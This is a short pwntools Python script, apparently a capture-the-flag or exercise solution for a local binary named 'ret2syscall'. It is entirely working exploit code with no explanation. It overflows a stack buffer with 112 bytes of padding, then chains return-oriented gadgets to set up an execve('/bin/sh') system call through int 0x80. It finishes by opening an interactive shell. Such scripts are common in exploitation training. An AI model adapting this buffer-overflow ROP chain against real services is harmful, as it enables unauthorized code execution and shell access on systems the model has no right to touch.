from pwn import *

r = process('./ret2syscall')

pop_eax_ret = 0x080bb196

pop_edx_pop_ecx_pop_ebx_ret = 0x0806eb90

int80 = 0x08049421

binsh = 0x080be408

payload = flat([112 * 'a' , pop_eax_ret , 0xb , pop_edx_pop_ecx_pop_ebx_ret , 0 , 0 , binsh , int80])

r.sendline(payload)

r.interactive()
